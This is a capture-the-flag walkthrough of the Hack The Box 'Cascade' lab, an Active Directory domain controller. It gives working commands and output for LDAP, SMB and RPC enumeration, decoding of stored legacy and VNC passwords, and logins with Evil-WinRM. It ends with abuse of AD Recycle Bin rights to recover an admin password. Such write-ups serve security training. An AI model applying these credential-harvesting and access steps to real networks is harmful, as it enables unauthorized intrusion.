---
description: 09-09-22
---

# Cascade (Medium)

### Improved skills

* LDAP queries
* Patience through enumeration within the file system
* Base64 Decoding
* Patience with SMB enumeration

### Used tools

* Nmap -- NmapAutomator.sh
* Enum4Linux
* GetNPUsers
* rpcclient
* smbmap/smbclient
* sqlite3

## Information Gathering

Scanned all TCP ports:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-10 02:38:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

Enumerated UDP ports:

```
PORT    STATE SERVICE VERSION
53/udp  open  domain  Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
123/udp open  ntp     NTP v3
389/udp open  ldap    Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

Notes:

53/DNS -- Zone Transfer

88/Kerberos -- AS-REP Roasting (User no pass) or Kerberoasting (User and password)

135/RPC -- rpcclient

389/LDAP -- ldapsearch&#x20;

445/SMB -- smbmap, smbclient, enum4linux

5985/WinRM -- Evil-WinRM will more than likely be used to authenticate to the target

## Enumeration

### 53/DNS -- Zone Transfer

* Zone transfer failed

### Enum4Linux

```
enum4linux -a 10.129.54.147

[+] Server 10.129.54.147 allows sessions using username '', password ''

```

* We see that the server allows for sessions using null or anonymous authentication
* Let's try to exploit this via rpcclient or smbmap/smbclient

### GetNPUsers

* AS-REPRoasting attempt <mark style="color:yellow;">failed</mark>

```
impacket-GetNPUsers cascade.local/ -no-pass -usersfile users

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User arksvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User util doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.wakefield doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.hickson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.goodhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a.turnbull doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User d.burman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BackupSvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.allen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

* Nothing lucrative out of this

### rpcclient

* Since we noticed that we can authenticate via '' let's try it

```
rpcclient \\\\10.129.54.147 -U '' -N
```

### Nmap ldap\* NSE Script

```
sudo nmap -n -sV --script "ldap* and not brute" 10.129.54.147
```

* This command contained very long output and did not seem to have anything of use in it.

### ldapsearch

* We will attempt to perform an LDAP query
* This seriously took forever to go through

```
ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.129.54.147 > results.txt

Ryan Thompson, Users, UK, cascade.local
sAMAccountName: r.thompson
cascadeLegacyPwd: clk0bjVldmE=

```

Username: <mark style="color:yellow;">r.thompson</mark>

cascadeLegacyPwd: clk0bjVldmE=&#x20;

<mark style="color:yellow;">rY4n5eva</mark>

* This looks BASE64 encoded. Let's decode it to see if we can see if it is a valid password

```
echo 'clk0bjVldmE=' | base64 -d
rY4n5eva
```

### Crackmapexec

```
crackmapexec smb 10.129.54.147 -u users -p passwords --continue-on-success
SMB         10.129.54.147   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
```

* We confirm that <mark style="color:yellow;">r.thompson</mark> and <mark style="color:yellow;">rY4n5eva</mark> are valid creds
* Now, we have to enumerate the SMB share to uncover more information

### smbmap

* Time to use our fresh credentials and enumerate SMB

Test anonymous authentication

```
smbmap -H 10.129.54.147
Fails
```

Authenticated test

```
smbmap -H 10.129.54.147 -u r.thompson -p rY4n5eva

[+] IP: 10.129.54.147:445       Name: cascade.local                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 
```

### smbclient

```
smbclient \\\\10.129.54.147\\Data -U r.thompson

Contractors                         D        0  Sun Jan 12 20:45:11 2020
  Finance                             D        0  Sun Jan 12 20:45:06 2020
  IT                                  D        0  Tue Jan 28 13:04:51 2020
  Production                          D        0  Sun Jan 12 20:45:18 2020
  Temps                               D        0  Sun Jan 12 20:45:15 2020
```

* I see that I have access to the IT directory only

#### Meeting\_Notes\_June\_2018.html

```
<p>For anyone that missed yesterday�s meeting (I�m looking at
you Ben). Main points are below:</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p>-- New production network will be going live on
Wednesday so keep an eye out for any issues. </p>

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<p>-- The winner of the �Best GPO� competition will be
announced on Friday so get your submissions in soon.</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p class=MsoNormal>Steve</p>
```

* We see a Username of <mark style="color:yellow;">TempAdmin</mark>

VNC Install.reg

```
cat VNC\ Install.reg

"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

* We see a password in hex. Let's decode it.
* First, to decode we need to use a tool called vncpasswd.py

{% embed url="https://github.com/trinitronx/vncpasswd.py" %}
GitHub Repo
{% endembed %}

### vncpasswd.py

Usage

* Remove the commas

```
./vncpasswd.py -d -H 6bcf2a4b6e5aca0f
Decrypted Bin Pass= 'sT333ve2'
Decrypted Hex Pass= '7354333333766532'
```

* We now get a password of <mark style="color:yellow;">sT333ve2</mark>

### Evil-WinRM

```
evil-winrm -i 10.129.54.147 -u s.smith
Enter Password: sT333ve2

*Evil-WinRM* PS C:\Users\s.smith\Documents>
```

* <mark style="color:yellow;">We are now s.smith!</mark>

### smbmap

```
smbmap -H 10.129.54.147 -u s.smith -p sT333ve2

[+] IP: 10.129.54.147:445       Name: cascade.local                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 
```

### smbclient

* The following setup will recursively download all of the files to your PWD on your Kali machine
* This will save you lots of time

```
smbclient '\\\\10.129.54.147\\Audit$' -U s.smith 
Password: sT333ve2
smb: \> mask ""
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
getting file \CascAudit.exe of size 13312 as CascAudit.exe (41.3 KiloBytes/sec) (average 41.3 KiloBytes/sec)
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (47.8 KiloBytes/sec) (average 44.2 KiloBytes/sec)
getting file \RunAudit.bat of size 45 as RunAudit.bat (0.3 KiloBytes/sec) (average 35.7 KiloBytes/sec)
getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (1134.2 KiloBytes/sec) (average 374.8 KiloBytes/sec)
getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (1002.7 KiloBytes/sec) (average 470.4 KiloBytes/sec)
getting file \DB\Audit.db of size 24576 as DB/Audit.db (118.2 KiloBytes/sec) (average 419.3 KiloBytes/sec)
getting file \x64\SQLite.Interop.dll of size 1639936 as x64/SQLite.Interop.dll (4958.2 KiloBytes/sec) (average 1270.6 KiloBytes/sec)
getting file \x86\SQLite.Interop.dll of size 1246720 as x86/SQLite.Interop.dll (4831.3 KiloBytes/sec) (average 1725.2 KiloBytes/sec)
smb: \> exit
```

* I notice that I get good information from Audit.db

### Audit.db

Open DB file

```
sqlite3 Audit.db
sqlite> .tables
DeletedUserAudit  Ldap              Misc            
sqlite> select * from DeletedUserAudit
   ...> ;
6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

* I then took the string <mark style="color:yellow;">BQO5l5Kj9MdErXx6Q6AGOw==</mark>&#x20;
* It looks like it could possibly correspond to ArkSvc
* I attempted to decode it using Base64 but it did not work and the characters are nonprintable so I am assuming it is encrypted somehow
* With this information, I then go to Google "decode BQO5l5Kj9MdErXx6Q6AGOw=="
  * The first site I see is dotnetfiddle.net and I see <mark style="color:yellow;">w3lc0meFr31nd</mark>

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Let's confirm our finding with CrackMapExec

```
crackmapexec smb -u 'arksvc' -p 'w3lc0meFr31nd'
SMB         10.129.54.147   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.54.147   445    CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd 

```

We see that we get a hit with <mark style="color:yellow;">arksvc:w3lc0meFr31nd</mark>

Lets check login with Evil-WinRM

```
evil-winrm -i 10.129.54.147 -u arksvc
Password: w3lc0meFr31nd
```

## Privilege Escalation

### Local enumeration

whoami /priv

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

* I do not see anything interesting here

whoami /all

```
ser Name      SID
============== ==============================================
cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

* I quickly noticed something that I have not seen before, our user <mark style="color:yellow;">ark\_svc is part of the AD Recycle Bin Group</mark>
* Let's start thinking about how we can take advantage of this

{% embed url="https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html" %}

#### Step 1: Restoring AD Objects Using PowerShell Commands

```
Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```

* We see <mark style="color:yellow;">TempAdmin</mark>
* I then remember that in a previously found document, it had mentioned something about password reusage with the TempAdmin account

#### Meeting\_Notes\_June\_2018.html

```
<p>For anyone that missed yesterday�s meeting (I�m looking at
you Ben). Main points are below:</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p>-- New production network will be going live on
Wednesday so keep an eye out for any issues. </p>

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<p>-- The winner of the �Best GPO� competition will be
announced on Friday so get your submissions in soon.</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p class=MsoNormal>Steve</p>
```

* <mark style="color:yellow;">"Username is TempAdmin (password is the same as the normal admin account password)."</mark>

#### Walkthrough

```
Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects

Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *

# Use SHIFT+CTRL+F to search for Legacy and you will see this
cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz
```

* <mark style="color:yellow;">cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz</mark>
* I think at this point, you know what kind of encoding we are using... Base64

#### Base64 Decoding

```
echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
baCT3r1aN00dles
```

<mark style="color:yellow;">Password:</mark> <mark style="color:red;">baCT3r1aN00dles</mark>

### PrivEsc vector

Clear-Text Credentials

cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz

<mark style="color:red;">baCT3r1aN00dles</mark>

<mark style="color:red;">Administrator:Evil-WinRM</mark>

## Proofs

User

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption><p>User Flag</p></figcaption></figure>

SYSTEM

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption><p>SYSTEM Flag</p></figcaption></figure>
